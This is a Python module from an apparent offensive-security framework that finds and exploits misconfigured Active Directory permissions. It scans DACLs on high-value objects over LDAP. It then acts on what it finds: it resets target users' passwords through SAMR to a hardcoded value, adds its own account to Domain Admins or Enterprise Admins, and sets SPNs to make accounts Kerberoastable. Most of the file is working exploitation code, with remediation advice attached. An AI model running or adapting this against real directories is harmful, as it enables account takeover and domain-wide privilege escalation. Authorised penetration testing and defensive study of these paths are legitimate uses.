"""Active Directory DACL/ACL abuse detection and exploitation.

Queries LDAP for security descriptors on high-value AD objects (Domain
Admins, Enterprise Admins, AdminSDHolder, domain root, user accounts,
computer accounts with delegation, GPOs) and parses DACLs to find
dangerous permissions that our controlled principal can exploit.

When exploitable permissions are found, the module can:
  - ForceChangePassword via SAMR to reset a target user's password
  - AddMember to insert our user into a privileged group
  - WriteSPN to set an SPN for targeted Kerberoasting

Every exploitable permission chain is registered in the attack graph
so downstream modules (lateral_move, kerberoast) can consume the
results.

References:
    - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse
    - https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html
    - https://posts.specterops.io/an-ace-up-the-sleeve-designing-active-directory-dacl-backdoors-2972f1e7f8e2
"""

from __future__ import annotations

import asyncio
import contextlib
import logging
import struct
from typing import TYPE_CHECKING, Any

from pacdoor.core.models import (
    Credential,
    CredentialType,
    Evidence,
    ExploitSafety,
    Finding,
    Phase,
    Severity,
)
from pacdoor.modules.base import BaseModule

if TYPE_CHECKING:
    from pacdoor.modules.base import ModuleContext

log = logging.getLogger(__name__)

# ── Lazy import flags ──────────────────────────────────────────────────

_ldap3_available: bool | None = None
_impacket_available: bool | None = None


def _ensure_ldap3() -> bool:
    global _ldap3_available  # noqa: PLW0603
    if _ldap3_available is not None:
        return _ldap3_available
    try:
        import ldap3  # type: ignore[import-untyped]  # noqa: F401

        _ldap3_available = True
    except ImportError:
        log.debug("ldap3 not installed -- DACL abuse module unavailable")
        _ldap3_available = False
    return _ldap3_available


def _ensure_impacket() -> bool:
    global _impacket_available  # noqa: PLW0603
    if _impacket_available is not None:
        return _impacket_available
    try:
        from impacket.ldap import ldaptypes  # type: ignore[import-untyped]  # noqa: F401

        _impacket_available = True
    except ImportError:
        log.debug("impacket not installed -- DACL SD parsing unavailable")
        _impacket_available = False
    return _impacket_available


# ── Access-mask constants ──────────────────────────────────────────────

_GENERIC_ALL = 0x10000000
_GENERIC_WRITE = 0x40000000
_WRITE_DACL = 0x00040000
_WRITE_OWNER = 0x00080000
_WRITE_PROPERTY = 0x00000020
_ADS_RIGHT_DS_CONTROL_ACCESS = 0x00000100
_ADS_RIGHT_DS_WRITE_PROP = 0x00000020
_ADS_RIGHT_DS_SELF = 0x00000008

# Extended-right / property-set GUIDs (lowercase, no braces)
_GUID_FORCE_CHANGE_PASSWORD = "00299570-246d-11d0-a768-00aa006e0529"
_GUID_ADD_MEMBER = "bf9679c0-0de6-11d0-a285-00aa003049e2"
_GUID_WRITE_SPN = "f3a64788-5306-11d1-a9c5-0000f80367c1"
_GUID_ALL_EXTENDED_RIGHTS = "00000000-0000-0000-0000-000000000000"
_GUID_WRITE_ACCOUNT_RESTRICTIONS = "4c164200-20c0-11d0-a768-00aa006e0529"

# Well-known SID patterns
_SID_DOMAIN_ADMINS_RID = 512
_SID_ENTERPRISE_ADMINS_RID = 519
_SID_ADMINISTRATOR_RID = 500
_SID_EVERYONE = "S-1-1-0"
_SID_AUTHENTICATED_USERS = "S-1-5-11"
_SID_SELF = "S-1-5-10"

# Human-readable permission names for findings
_DANGEROUS_MASKS: dict[int, str] = {
    _GENERIC_ALL: "GenericAll",
    _GENERIC_WRITE: "GenericWrite",
    _WRITE_DACL: "WriteDACL",
    _WRITE_OWNER: "WriteOwner",
}

_DANGEROUS_GUIDS: dict[str, str] = {
    _GUID_FORCE_CHANGE_PASSWORD: "ForceChangePassword",
    _GUID_ADD_MEMBER: "AddMember",
    _GUID_WRITE_SPN: "WriteSPN",
    _GUID_ALL_EXTENDED_RIGHTS: "AllExtendedRights (includes DCSync)",
    _GUID_WRITE_ACCOUNT_RESTRICTIONS: "WriteAccountRestrictions (RBCD)",
}


# ── Synchronous LDAP helpers ──────────────────────────────────────────


def _ldap_connect(
    server_ip: str,
    domain: str,
    username: str,
    password: str,
    use_ssl: bool = False,
) -> Any | None:
    """Establish an authenticated LDAP connection."""
    try:
        import ldap3  # type: ignore[import-untyped]

        port = 636 if use_ssl else 389
        server = ldap3.Server(server_ip, port=port, use_ssl=use_ssl, get_info=ldap3.ALL)

        if "\\" not in username and "@" not in username:
            bind_dn = f"{domain}\\{username}"
        else:
            bind_dn = username

        conn = ldap3.Connection(
            server, user=bind_dn, password=password,
            authentication=ldap3.NTLM if "\\" in bind_dn else ldap3.SIMPLE,
            auto_bind=True,
            read_only=False,
            receive_timeout=30,
        )
        return conn
    except Exception as e:
        log.debug("LDAP bind to %s failed: %s", server_ip, e)
        return None


def _get_base_dn(domain: str) -> str:
    """Convert 'corp.local' to 'DC=corp,DC=local'."""
    return ",".join(f"DC={part}" for part in domain.split("."))


def _get_attr(entry: Any, attr: str, default: Any = None) -> Any:
    """Safely extract an attribute from an ldap3 entry."""
    try:
        val = getattr(entry, attr, default)
        if val is None:
            return default
        if hasattr(val, "value"):
            return val.value
        if hasattr(val, "values"):
            return val.values
        return val
    except Exception:
        return default


def _sid_to_string(raw_sid: bytes) -> str:
    """Convert a raw SID binary blob to its S-x-y-... string form."""
    try:
        revision = raw_sid[0]
        sub_auth_count = raw_sid[1]
        authority = int.from_bytes(raw_sid[2:8], byteorder="big")
        subs = []
        for i in range(sub_auth_count):
            offset = 8 + i * 4
            subs.append(struct.unpack("<I", raw_sid[offset:offset + 4])[0])
        return f"S-{revision}-{authority}-" + "-".join(str(s) for s in subs)
    except Exception:
        return ""


def _guid_from_bytes(raw: bytes) -> str:
    """Convert raw 16-byte ObjectType GUID to lowercase dashed string."""
    try:
        # Microsoft encodes GUIDs as mixed-endian
        p1 = struct.unpack("<IHH", raw[:8])
        p2 = raw[8:10]
        p3 = raw[10:16]
        return (
            f"{p1[0]:08x}-{p1[1]:04x}-{p1[2]:04x}-"
            f"{p2[0]:02x}{p2[1]:02x}-"
            + "".join(f"{b:02x}" for b in p3)
        )
    except Exception:
        return ""


def _resolve_sid(conn: Any, base_dn: str, sid_string: str) -> str:
    """Resolve a SID to sAMAccountName via LDAP. Returns SID on failure."""
    try:
        import ldap3  # type: ignore[import-untyped]

        conn.search(
            search_base=base_dn,
            search_filter=f"(objectSid={sid_string})",
            search_scope=ldap3.SUBTREE,
            attributes=["sAMAccountName"],
            size_limit=1,
        )
        if conn.entries:
            name = _get_attr(conn.entries[0], "sAMAccountName", "")
            if name:
                return str(name)
    except Exception:
        pass
    return sid_string


# ── Security descriptor parsing ───────────────────────────────────────


def _fetch_sd_entries(
    conn: Any,
    base_dn: str,
    search_filter: str,
    size_limit: int = 100,
) -> list[Any]:
    """Search LDAP with LDAP_SERVER_SD_FLAGS_OID to retrieve nTSecurityDescriptor.

    The SD flags control (1.2.840.113556.1.4.801) requests DACL only
    (flag value 4) to minimize bandwidth.
    """
    import ldap3  # type: ignore[import-untyped]

    entries: list[Any] = []
    try:
        # SD flags: 0x04 = DACL_SECURITY_INFORMATION
        sd_control = ldap3.protocol.controls.build_control(
            "1.2.840.113556.1.4.801", True, struct.pack("<I", 0x04),
        )
        conn.search(
            search_base=base_dn,
            search_filter=search_filter,
            search_scope=ldap3.SUBTREE,
            attributes=[
                "nTSecurityDescriptor", "distinguishedName",
                "sAMAccountName", "objectClass", "objectSid",
            ],
            controls=[sd_control],
            size_limit=size_limit,
        )
        entries.extend(conn.entries)
    except Exception as e:
        log.debug("SD fetch failed for filter %s: %s", search_filter, e)
    return entries


def _parse_dacl_aces(
    raw_sd: bytes,
    our_sid: str,
    conn: Any,
    base_dn: str,
) -> list[dict[str, str]]:
    """Parse a raw nTSecurityDescriptor and return dangerous ACEs.

    Only returns ACEs where the trustee is our controlled principal
    (matched by SID) or a well-known over-permissive group (Everyone,
    Authenticated Users, Self).
    """
    from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR  # type: ignore[import-untyped]

    dangerous: list[dict[str, str]] = []

    try:
        sd = SR_SECURITY_DESCRIPTOR(data=raw_sd)
    except Exception as e:
        log.debug("Failed to parse security descriptor: %s", e)
        return dangerous

    if sd["Dacl"] is None:
        return dangerous

    controllable_sids = {
        our_sid,
        _SID_EVERYONE,
        _SID_AUTHENTICATED_USERS,
        _SID_SELF,
    }

    for ace in sd["Dacl"].aces:
        try:
            # Only care about ACCESS_ALLOWED ACEs (type 0x00 and 0x05)
            ace_type = ace["TypeName"]
            if "ALLOWED" not in ace_type:
                continue

            ace_sid = ace["Ace"]["Sid"].formatCanonical()
            if ace_sid not in controllable_sids:
                continue

            mask = ace["Ace"]["Mask"]["Mask"]
            trustee = _resolve_sid(conn, base_dn, ace_sid)

            # Check mask-level dangerous permissions
            for flag, label in _DANGEROUS_MASKS.items():
                if mask & flag:
                    dangerous.append({
                        "trustee_sid": ace_sid,
                        "trustee_name": trustee,
                        "permission": label,
                        "mask": f"0x{mask:08x}",
                    })

            # Check extended rights / property GUIDs on object ACEs
            if "OBJECT" in ace_type and hasattr(ace["Ace"], "fields"):
                obj_type_raw = None
                # impacket stores ObjectType in the ACE structure
                ace_data = ace["Ace"]
                if hasattr(ace_data, "hasFlag") and ace_data.hasFlag(0x01) or "ObjectType" in ace_data.fields:
                    obj_type_raw = ace_data["ObjectType"]

                if obj_type_raw is not None:
                    guid_str = _guid_from_bytes(bytes(obj_type_raw))
                    guid_label = _DANGEROUS_GUIDS.get(guid_str)
                    if guid_label:
                        dangerous.append({
                            "trustee_sid": ace_sid,
                            "trustee_name": trustee,
                            "permission": guid_label,
                            "mask": f"0x{mask:08x}",
                        })

                # AllExtendedRights when CONTROL_ACCESS on null GUID
                if mask & _ADS_RIGHT_DS_CONTROL_ACCESS and obj_type_raw is None:
                    dangerous.append({
                        "trustee_sid": ace_sid,
                        "trustee_name": trustee,
                        "permission": "AllExtendedRights (includes DCSync)",
                        "mask": f"0x{mask:08x}",
                    })

        except Exception as e:
            log.debug("Failed to parse ACE: %s", e)
            continue

    return dangerous


# ── Exploitation helpers (synchronous, run via to_thread) ─────────────


def _exploit_force_change_password(
    dc_ip: str,
    domain: str,
    username: str,
    password: str,
    target_user: str,
    new_password: str,
) -> bool:
    """Reset a target user's password via SAMR (MS-SAMR SetUserInfo2)."""
    try:
        from impacket.dcerpc.v5 import samr, transport  # type: ignore[import-untyped]

        rpctransport = transport.SMBTransport(dc_ip, 445, r"\samr")
        rpctransport.set_credentials(username, password, domain)

        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)

        server_handle = samr.hSamrConnect(dce)["ServerHandle"]
        domain_sid = samr.hSamrLookupDomainInSamServer(
            dce, server_handle, domain,
        )["DomainId"]
        domain_handle = samr.hSamrOpenDomain(
            dce, server_handle, domainId=domain_sid,
        )["DomainHandle"]

        rid = samr.hSamrLookupNamesInDomain(
            dce, domain_handle, [target_user],
        )["RelativeIds"]["Element"][0]["Data"]
        user_handle = samr.hSamrOpenUser(
            dce, domain_handle, userId=rid,
        )["UserHandle"]

        user_info = samr.SAMPR_USER_INFO_BUFFER()
        user_info["tag"] = samr.USER_INFORMATION_CLASS.UserInternal5Information
        user_info["Internal5"]["UserPassword"] = new_password
        user_info["Internal5"]["PasswordExpired"] = 0

        samr.hSamrSetInformationUser2(dce, user_handle, user_info)
        samr.hSamrCloseHandle(dce, user_handle)
        dce.disconnect()
        return True
    except Exception as e:
        log.debug("ForceChangePassword for %s failed: %s", target_user, e)
        return False


def _exploit_add_member(
    dc_ip: str,
    domain: str,
    username: str,
    password: str,
    group_dn: str,
    member_dn: str,
) -> bool:
    """Add a member to an AD group via LDAP modify."""
    try:
        import ldap3  # type: ignore[import-untyped]

        if "\\" not in username and "@" not in username:
            bind_dn = f"{domain}\\{username}"
        else:
            bind_dn = username

        server = ldap3.Server(dc_ip, port=389, get_info=ldap3.ALL)
        conn = ldap3.Connection(
            server, user=bind_dn, password=password,
            authentication=ldap3.NTLM if "\\" in bind_dn else ldap3.SIMPLE,
            auto_bind=True,
        )
        conn.modify(
            group_dn,
            {"member": [(ldap3.MODIFY_ADD, [member_dn])]},
        )
        success = conn.result["result"] == 0
        conn.unbind()
        return success
    except Exception as e:
        log.debug("AddMember to %s failed: %s", group_dn, e)
        return False


def _exploit_write_spn(
    dc_ip: str,
    domain: str,
    username: str,
    password: str,
    target_dn: str,
    spn_value: str,
) -> bool:
    """Set a servicePrincipalName on a target user for targeted Kerberoasting."""
    try:
        import ldap3  # type: ignore[import-untyped]

        if "\\" not in username and "@" not in username:
            bind_dn = f"{domain}\\{username}"
        else:
            bind_dn = username

        server = ldap3.Server(dc_ip, port=389, get_info=ldap3.ALL)
        conn = ldap3.Connection(
            server, user=bind_dn, password=password,
            authentication=ldap3.NTLM if "\\" in bind_dn else ldap3.SIMPLE,
            auto_bind=True,
        )
        conn.modify(
            target_dn,
            {"servicePrincipalName": [(ldap3.MODIFY_ADD, [spn_value])]},
        )
        success = conn.result["result"] == 0
        conn.unbind()
        return success
    except Exception as e:
        log.debug("WriteSPN on %s failed: %s", target_dn, e)
        return False


# ── Severity mapping ──────────────────────────────────────────────────


def _severity_for_permission(permission: str, target_type: str) -> Severity:
    """Map a permission + target type to a finding severity."""
    critical_perms = {
        "GenericAll", "AllExtendedRights (includes DCSync)", "WriteDACL",
    }
    high_perms = {
        "WriteOwner", "ForceChangePassword", "AddMember", "GenericWrite",
    }
    if permission in critical_perms:
        return Severity.CRITICAL
    if permission in high_perms:
        return Severity.HIGH
    if target_type in ("Domain Admins", "Enterprise Admins", "domain_root"):
        return Severity.HIGH
    return Severity.MEDIUM


# ── Module ────────────────────────────────────────────────────────────


class DACLAbuseModule(BaseModule):
    """Active Directory DACL/ACL abuse detection and exploitation.

    Enumerates DACLs on high-value AD objects to find dangerous
    permissions (GenericAll, WriteDACL, WriteOwner, ForceChangePassword,
    AddMember, WriteSPN, AllExtendedRights, WriteAccountRestrictions).
    Exploits discovered permissions when our principal has direct access.
    """

    name = "post.dacl_abuse"
    description = "Detect and exploit misconfigured AD DACL permissions"
    phase = Phase.POST_EXPLOIT
    attack_technique_ids = ["T1222.001", "T1098"]
    required_facts = ["credential.valid"]
    produced_facts = ["credential.admin", "vuln.dacl_abuse"]
    safety = ExploitSafety.DANGEROUS

    async def check(self, ctx: ModuleContext) -> bool:
        """Verify both ldap3 and impacket are available."""
        if not _ensure_ldap3():
            return False
        if not _ensure_impacket():
            return False
        return await super().check(ctx)

    async def run(self, ctx: ModuleContext) -> list[Finding]:
        findings: list[Finding] = []

        if not _ensure_ldap3() or not _ensure_impacket():
            return findings

        # ── Resolve credentials ───────────────────────────────────────
        creds = await ctx.facts.get_all("credential.valid")
        if not creds:
            return findings

        username: str | None = None
        password: str | None = None
        domain: str | None = None

        for cred_fact in creds:
            cred = cred_fact.value
            u = cred.username if hasattr(cred, "username") else str(cred.get("username", ""))
            p = cred.value if hasattr(cred, "value") else str(cred.get("value", ""))
            d = cred.domain if hasattr(cred, "domain") else str(cred.get("domain", ""))
            if u and p and d:
                username, password, domain = u, p, d
                break

        if not username or not password or not domain:
            log.debug("dacl_abuse: no usable domain credential found")
            return findings

        # ── Resolve DC IP from LDAP or domain.info facts ─────────────
        dc_ip: str | None = None
        for svc_type in ("service.ldap", "service.kerberos"):
            svc_facts = await ctx.facts.get_all(svc_type)
            for svc_fact in svc_facts:
                if svc_fact.host_id:
                    dc_ip = await self.resolve_ip(ctx, svc_fact.host_id)
                    if dc_ip:
                        break
            if dc_ip:
                break

        # Fallback: try domain.info for DC address
        if dc_ip is None:
            domain_info = await ctx.facts.get_values("domain.info")
            for info in domain_info:
                if isinstance(info, dict) and info.get("dc_ip"):
                    dc_ip = info["dc_ip"]
                    break

        if dc_ip is None:
            log.debug("dacl_abuse: no DC IP resolved")
            return findings

        # ── Connect to LDAP ───────────────────────────────────────────
        await ctx.rate_limiter.acquire()
        conn = None
        bound_host_id: str | None = None

        for use_ssl in (True, False):
            conn = await asyncio.to_thread(
                _ldap_connect, dc_ip, domain, username, password, use_ssl,
            )
            if conn is not None:
                break

        if conn is None:
            log.debug("dacl_abuse: LDAP bind failed to %s", dc_ip)
            return findings

        # Resolve our own SID for ACE matching
        base_dn = _get_base_dn(domain)
        our_sid = ""
        try:
            import ldap3  # type: ignore[import-untyped]

            await ctx.rate_limiter.acquire()
            our_entries = await asyncio.to_thread(
                lambda: (
                    conn.search(
                        search_base=base_dn,
                        search_filter=f"(sAMAccountName={username})",
                        search_scope=ldap3.SUBTREE,
                        attributes=["objectSid", "distinguishedName"],
                        size_limit=1,
                    ),
                    list(conn.entries),
                ),
            )
            entries = our_entries[1]
            if entries:
                raw_sid = _get_attr(entries[0], "objectSid", b"")
                if isinstance(raw_sid, bytes) and raw_sid:
                    our_sid = _sid_to_string(raw_sid)
                our_dn = str(_get_attr(entries[0], "distinguishedName", ""))
            else:
                our_dn = ""
        except Exception as e:
            log.debug("dacl_abuse: failed to resolve our SID: %s", e)
            our_dn = ""

        if not our_sid:
            log.debug("dacl_abuse: could not determine our SID, aborting")
            return findings

        # ── Enumerate DACLs on high-value targets ─────────────────────

        # Define target categories with their LDAP filters
        targets: list[tuple[str, str, int]] = [
            ("Domain Admins", "(cn=Domain Admins)", 5),
            ("Enterprise Admins", "(cn=Enterprise Admins)", 5),
            ("domain_root", f"(distinguishedName={base_dn})", 1),
            ("AdminSDHolder", f"(distinguishedName=CN=AdminSDHolder,CN=System,{base_dn})", 1),
            ("users_sample", "(&(objectClass=user)(!(objectClass=computer)))", 50),
            (
                "delegation_computers",
                "(&(objectClass=computer)"
                "(userAccountControl:1.2.840.113556.1.4.803:=524288))",
                20,
            ),
            (
                "gpo_objects",
                "(objectClass=groupPolicyContainer)",
                30,
            ),
        ]

        all_dangerous: list[dict[str, Any]] = []

        for target_label, ldap_filter, limit in targets:
            await ctx.rate_limiter.acquire()
            entries = await asyncio.to_thread(
                _fetch_sd_entries, conn, base_dn, ldap_filter, limit,
            )

            for entry in entries:
                raw_sd = _get_attr(entry, "nTSecurityDescriptor", b"")
                if not isinstance(raw_sd, bytes) or not raw_sd:
                    continue

                target_name = str(
                    _get_attr(entry, "sAMAccountName", "")
                    or _get_attr(entry, "distinguishedName", "unknown")
                )
                target_dn = str(_get_attr(entry, "distinguishedName", ""))

                aces = _parse_dacl_aces(raw_sd, our_sid, conn, base_dn)
                for ace_info in aces:
                    record = {
                        **ace_info,
                        "target_name": target_name,
                        "target_dn": target_dn,
                        "target_type": target_label,
                    }
                    all_dangerous.append(record)

        if not all_dangerous:
            log.debug("dacl_abuse: no dangerous DACLs found")
            return findings

        # ── Create findings per dangerous permission ──────────────────

        for entry in all_dangerous:
            severity = _severity_for_permission(
                entry["permission"], entry["target_type"],
            )
            finding = Finding(
                title=(
                    f"DACL abuse: {entry['permission']} on "
                    f"{entry['target_name']}"
                ),
                description=(
                    f"The principal {entry['trustee_name']} "
                    f"(SID: {entry['trustee_sid']}) has "
                    f"{entry['permission']} permission on "
                    f"{entry['target_name']} ({entry['target_dn']}). "
                    f"This permission can be abused to escalate "
                    f"privileges in the domain."
                ),
                severity=severity,
                attack_technique_ids=self.attack_technique_ids,
                module_name=self.name,
                evidence=[
                    Evidence(
                        kind="dacl_permission",
                        data=(
                            f"Source: {entry['trustee_name']} "
                            f"({entry['trustee_sid']})\n"
                            f"Target: {entry['target_name']} "
                            f"({entry['target_dn']})\n"
                            f"Permission: {entry['permission']}\n"
                            f"Mask: {entry['mask']}"
                        ),
                    ),
                ],
                remediation=(
                    "Remove excessive permissions from the DACL. "
                    "Implement the principle of least privilege for "
                    "AD object permissions. Use AdminSDHolder to "
                    "protect privileged accounts. Audit DACL changes "
                    "via event IDs 5136/4662. Run BloodHound regularly "
                    "to detect new attack paths."
                ),
                verified=True,
            )
            findings.append(finding)

            if ctx.db is not None:
                await ctx.db.insert_finding(finding)

            await ctx.facts.add(
                "vuln.dacl_abuse", entry, self.name,
            )

        # ── Exploitation phase ────────────────────────────────────────

        # Only exploit permissions held by our own SID (not Everyone, etc.)
        exploitable = [
            e for e in all_dangerous if e["trustee_sid"] == our_sid
        ]

        for entry in exploitable:
            perm = entry["permission"]
            target_dn = entry["target_dn"]
            target_name = entry["target_name"]

            # --- ForceChangePassword ---
            if perm == "ForceChangePassword":
                new_pw = "P@cD00r!Pwn3d#2026"
                await ctx.rate_limiter.acquire()
                success = await asyncio.to_thread(
                    _exploit_force_change_password,
                    dc_ip, domain, username, password,
                    target_name, new_pw,
                )
                if success:
                    new_cred = Credential(
                        username=target_name,
                        cred_type=CredentialType.PASSWORD,
                        value=new_pw,
                        domain=domain,
                        source_module=self.name,
                        valid=True,
                        admin=False,
                    )
                    await ctx.facts.add(
                        "credential.valid", new_cred, self.name,
                    )
                    if ctx.db is not None:
                        await ctx.db.insert_credential(new_cred)

                    path = ctx.attack_graph.add_step(
                        from_host_id=bound_host_id or dc_ip,
                        to_host_id=bound_host_id or dc_ip,
                        technique_id="T1098",
                        credential_id=new_cred.id,
                        description=(
                            f"ForceChangePassword on {target_name} "
                            f"via DACL abuse by {username}"
                        ),
                    )
                    if ctx.db is not None:
                        await ctx.db.insert_attack_path(path)

                    findings.append(Finding(
                        title=f"Exploited ForceChangePassword on {target_name}",
                        description=(
                            f"Successfully reset password for {target_name} "
                            f"using ForceChangePassword DACL permission. "
                            f"New credential stored in fact store."
                        ),
                        severity=Severity.CRITICAL,
                        attack_technique_ids=["T1098"],
                        module_name=self.name,
                        evidence=[
                            Evidence(kind="exploit_result", data="Password reset successful"),
                            Evidence(kind="target_user", data=target_name),
                        ],
                        remediation=(
                            "Remove ForceChangePassword permission from "
                            "non-privileged principals. Monitor password "
                            "reset events (event ID 4724)."
                        ),
                        verified=True,
                    ))

            # --- AddMember on privileged groups ---
            elif perm == "AddMember" and entry["target_type"] in (
                "Domain Admins", "Enterprise Admins",
            ):
                if not our_dn:
                    continue
                await ctx.rate_limiter.acquire()
                success = await asyncio.to_thread(
                    _exploit_add_member,
                    dc_ip, domain, username, password,
                    target_dn, our_dn,
                )
                if success:
                    admin_cred = Credential(
                        username=username,
                        cred_type=CredentialType.PASSWORD,
                        value=password,
                        domain=domain,
                        source_module=self.name,
                        valid=True,
                        admin=True,
                    )
                    await ctx.facts.add(
                        "credential.admin", admin_cred, self.name,
                    )
                    if ctx.db is not None:
                        await ctx.db.insert_credential(admin_cred)

                    path = ctx.attack_graph.add_step(
                        from_host_id=bound_host_id or dc_ip,
                        to_host_id=bound_host_id or dc_ip,
                        technique_id="T1098",
                        credential_id=admin_cred.id,
                        description=(
                            f"AddMember: added {username} to "
                            f"{target_name} via DACL abuse"
                        ),
                    )
                    if ctx.db is not None:
                        await ctx.db.insert_attack_path(path)

                    findings.append(Finding(
                        title=(
                            f"Exploited AddMember on {target_name}"
                        ),
                        description=(
                            f"Successfully added {username} to the "
                            f"{target_name} group via AddMember DACL "
                            f"permission. Account now has domain admin "
                            f"privileges."
                        ),
                        severity=Severity.CRITICAL,
                        attack_technique_ids=["T1098"],
                        module_name=self.name,
                        evidence=[
                            Evidence(
                                kind="exploit_result",
                                data=f"Added {our_dn} to {target_dn}",
                            ),
                        ],
                        remediation=(
                            "Remove AddMember permission on privileged "
                            "groups from non-admin principals. Monitor "
                            "group membership changes via event ID 4728/4756."
                        ),
                        verified=True,
                    ))

            # --- WriteSPN for targeted Kerberoasting ---
            elif perm == "WriteSPN":
                spn_value = f"YOURSERVICE/{target_name}.{domain}"
                await ctx.rate_limiter.acquire()
                success = await asyncio.to_thread(
                    _exploit_write_spn,
                    dc_ip, domain, username, password,
                    target_dn, spn_value,
                )
                if success:
                    path = ctx.attack_graph.add_step(
                        from_host_id=bound_host_id or dc_ip,
                        to_host_id=bound_host_id or dc_ip,
                        technique_id="T1222.001",
                        description=(
                            f"WriteSPN: set SPN {spn_value} on "
                            f"{target_name} for targeted Kerberoasting"
                        ),
                    )
                    if ctx.db is not None:
                        await ctx.db.insert_attack_path(path)

                    await ctx.facts.add(
                        "ad.kerberoastable",
                        {"username": target_name, "spns": spn_value},
                        self.name,
                    )

                    findings.append(Finding(
                        title=(
                            f"Exploited WriteSPN on {target_name}"
                        ),
                        description=(
                            f"Set SPN {spn_value} on {target_name} via "
                            f"WriteSPN DACL permission. The account is "
                            f"now Kerberoastable — downstream modules "
                            f"can request and crack the TGS hash."
                        ),
                        severity=Severity.HIGH,
                        attack_technique_ids=["T1222.001"],
                        module_name=self.name,
                        evidence=[
                            Evidence(
                                kind="exploit_result",
                                data=f"SPN set: {spn_value} on {target_dn}",
                            ),
                        ],
                        remediation=(
                            "Remove WriteSPN permission from non-admin "
                            "principals. Monitor SPN changes via event "
                            "ID 5136 on servicePrincipalName attribute."
                        ),
                        verified=True,
                    ))

        # ── Close LDAP connection ─────────────────────────────────────
        with contextlib.suppress(Exception):
            conn.unbind()

        return findings
